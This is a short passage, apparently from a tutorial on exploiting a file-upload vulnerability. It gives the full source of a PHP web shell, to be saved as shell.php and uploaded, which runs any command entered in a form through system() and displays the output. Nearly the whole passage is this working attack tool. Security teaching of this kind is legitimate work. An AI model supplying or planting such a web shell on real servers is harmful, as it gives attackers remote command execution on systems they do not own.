Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the system() PHP function, and the output is displayed to the user.
